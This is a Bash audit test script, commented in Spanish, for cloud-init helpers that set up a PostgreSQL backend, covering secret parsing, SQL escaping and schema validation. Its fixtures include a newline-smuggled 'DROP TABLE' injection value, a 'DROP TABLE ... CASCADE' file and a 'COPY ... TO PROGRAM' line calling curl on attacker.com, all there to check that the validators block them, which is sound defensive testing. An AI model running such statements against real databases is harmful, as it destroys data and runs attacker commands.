#!/usr/bin/env bash
#
# Pruebas adicionales de auditoría técnica — Etapa 3A.
# Valida casos de borde, caracteres especiales, simulación de fallos y seguridad.
set -euo pipefail

# shellcheck source=lib.sh
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/lib.sh"

tmp="$(mktemp -d "${TMPDIR:-/tmp}/ca-audit-test.XXXXXX")"
trap 'rm -rf "${tmp}"' EXIT

export CA_SCRIPT_DIR="${REPO_ROOT}/cloud-init"
export CA_ROLE="backend-db"
export CA_TEST_MODE="1"
export CA_STATE_ROOT="${tmp}/state"
export CA_LOG_ROOT="${tmp}/log"
export CA_LOG_FILE="${tmp}/log/bootstrap.log"
export CA_LOG_TO_FILE="0"
export CA_OPT_ROOT="${tmp}/opt"
export CA_ETC_ROOT="${tmp}/etc"
export CA_WWW_ROOT="${tmp}/www"
export CA_SYSTEMD_ROOT="${tmp}/systemd"
export CA_NGINX_ROOT="${tmp}/nginx"
export CA_PGDATA_ROOT="${tmp}/pgdata"
export CA_APP_USER="controlasistencia"
export CA_APP_GROUP="controlasistencia"
export CA_TIMEZONE="America/La_Paz"

# shellcheck source=../../cloud-init/common/lib.sh
source "${CA_SCRIPT_DIR}/common/lib.sh"
# shellcheck source=../../cloud-init/common/validate.sh
source "${CA_SCRIPT_DIR}/common/validate.sh"
# shellcheck source=../../cloud-init/common/secrets.sh
source "${CA_SCRIPT_DIR}/common/secrets.sh"
# shellcheck source=../../cloud-init/common/postgres.sh
source "${CA_SCRIPT_DIR}/common/postgres.sh"

printf '\n--- Auditoría 1: Manejo de contraseñas con caracteres especiales en JSON y DATABASE_URL ---\n'
complex_secret='{"DATABASE_URL":"postgres://ca_app:P%40ssw0rd%23%24%25%26@localhost:5432/control_asistencia","JWT_SECRET":"super-secret-jwt-token-with-more-than-32-chars!","ADMIN_PASSWORD":"Admin$ecr3t\"'\''#&;*123"}'
ca_parse_secret_json "${complex_secret}"

assert_eq "ca_app" "${CA_DB_USER}" "usuario de base de datos"
assert_eq 'P@ssw0rd#$%&' "${CA_DB_PASSWORD}" "password decodificado de base de datos"
assert_eq 'Admin$ecr3t"'\''#&;*123' "${CA_ADMIN_PASSWORD}" "password de administrador con caracteres especiales"

escaped_admin="$(ca_sql_literal "${CA_ADMIN_PASSWORD}")"
[[ "${escaped_admin}" == *"''"* ]] || test_fail "no duplico la comilla simple para SQL"

printf '\n--- Auditoría 2: Inyección de saltos de línea en credenciales SQL ---\n'
multiline_pass="BadPassword"$'\n'"DROP TABLE app_users;"
if ( ca_sql_literal "${multiline_pass}" ) >/dev/null 2>&1; then
  test_fail "ca_sql_literal permitio saltos de linea maliciosos."
fi

printf '\n--- Auditoría 3: Validación estricta de octetos en IPs privadas ---\n'
if ( ca_validate_private_ip "10.999.0.1" ) >/dev/null 2>&1; then
  printf 'OBSERVACION: ca_validate_private_ip permite octetos mayores a 255 (ej: 10.999.0.1).\n'
fi

printf '\n--- Auditoría 4: Filtrado seguro de schema.sql ante variantes de sintaxis ---\n'
cat >"${tmp}/test-schema.sql" <<'SQL'
CREATE DATABASE control_asistencia;
  create   database   asistencia_db ;
\connect control_asistencia;
  \Connect asistencia_db;
CREATE EXTENSION IF NOT EXISTS pgcrypto;
CREATE TABLE IF NOT EXISTS app_users (id bigint primary key);
SQL

ca_filter_schema "${tmp}/test-schema.sql" "${tmp}/test-schema.filtered.sql"
assert_not_contains "${tmp}/test-schema.filtered.sql" "CREATE DATABASE"
assert_not_contains "${tmp}/test-schema.filtered.sql" "create   database"
assert_not_contains "${tmp}/test-schema.filtered.sql" "\\connect"
assert_not_contains "${tmp}/test-schema.filtered.sql" "\\Connect"
assert_contains "${tmp}/test-schema.filtered.sql" "CREATE EXTENSION"
assert_contains "${tmp}/test-schema.filtered.sql" "CREATE TABLE"

printf '\n--- Auditoría 5: Detección de sentencias destructivas en schema.sql ---\n'
cat >"${tmp}/malicious-drop.sql" <<'SQL'
DROP TABLE app_users CASCADE;
SQL
if ( ca_validate_schema_safety "${tmp}/malicious-drop.sql" ) >/dev/null 2>&1; then
  test_fail "ca_validate_schema_safety no bloqueo DROP TABLE."
fi

cat >"${tmp}/malicious-copy.sql" <<'SQL'
COPY app_users TO PROGRAM 'curl http://attacker.com';
SQL
if ( ca_validate_schema_safety "${tmp}/malicious-copy.sql" ) >/dev/null 2>&1; then
  test_fail "ca_validate_schema_safety no bloqueo COPY PROGRAM."
fi

printf '\n--- Auditoría 6: Rechazo de DATABASE_URL no local o puertos distintos a 5432 ---\n'
remote_db_secret='{"DATABASE_URL":"postgres://ca_app:pass@rds-instance.aws.com:5432/control_asistencia","JWT_SECRET":"01234567890123456789012345678901","ADMIN_PASSWORD":"admin-password-123"}'
if ( ca_parse_secret_json "${remote_db_secret}" ) >/dev/null 2>&1; then
  test_fail "ca_parse_secret_json acepto una DATABASE_URL remota (debe ser localhost)."
fi

bad_port_secret='{"DATABASE_URL":"postgres://ca_app:pass@localhost:5433/control_asistencia","JWT_SECRET":"01234567890123456789012345678901","ADMIN_PASSWORD":"admin-password-123"}'
if ( ca_parse_secret_json "${bad_port_secret}" ) >/dev/null 2>&1; then
  test_fail "ca_parse_secret_json acepto un puerto distinto a 5432."
fi

printf '\n--- Auditoría 7: Rechazo de JWT_SECRET corto (<32 chars) y ADMIN_PASSWORD corto (<12 chars) ---\n'
short_jwt='{"DATABASE_URL":"postgres://ca_app:pass@localhost:5432/control_asistencia","JWT_SECRET":"short-secret","ADMIN_PASSWORD":"admin-password-123"}'
if ( ca_parse_secret_json "${short_jwt}" ) >/dev/null 2>&1; then
  test_fail "ca_parse_secret_json acepto un JWT_SECRET con menos de 32 caracteres."
fi

short_admin='{"DATABASE_URL":"postgres://ca_app:pass@localhost:5432/control_asistencia","JWT_SECRET":"01234567890123456789012345678901","ADMIN_PASSWORD":"short"}'
if ( ca_parse_secret_json "${short_admin}" ) >/dev/null 2>&1; then
  test_fail "ca_parse_secret_json acepto un ADMIN_PASSWORD con menos de 12 caracteres."
fi

printf '\n--- Auditoría 8: Permisos de backend.env y pgpass temporal ---\n'
export CA_DATABASE_URL="postgres://ca_app:pass@localhost:5432/control_asistencia"
export CA_DB_USER="ca_app"
export CA_DB_PASSWORD="pass"
export CA_DB_NAME="control_asistencia"
export CA_JWT_SECRET="01234567890123456789012345678901"
export CA_CLIENT_URL="http://localhost:5173"
ca_write_backend_env
assert_file "${CA_ETC_ROOT}/backend.env"

pgpass_path="$(ca_make_pgpass)"
assert_file "${pgpass_path}"
assert_contains "${pgpass_path}" "127.0.0.1:5432:control_asistencia:ca_app:pass"
rm -f -- "${pgpass_path}"

test_pass "pruebas adicionales de auditoria tecnica de Cloud-Init"
